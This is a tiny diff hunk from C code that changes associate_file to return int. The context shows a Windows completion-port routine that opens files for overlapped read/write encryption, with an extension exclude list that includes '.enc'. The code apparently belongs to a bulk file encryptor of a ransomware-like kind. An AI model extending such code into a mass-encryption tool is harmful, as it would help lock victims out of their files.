@@ -9,7 +9,7 @@
 char *exclude[]={".pdf",".txt",".enc"};
 #ifdef _WIN32
 HANDLE CompletionPort;
-void associate_file(char *filename)
+int associate_file(char *filename)
 {
 HANDLE file = CreateFileA(filename,GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
       overlapped_enc *new_ovl = (overlapped_enc*)malloc(sizeof(overlapped_enc));
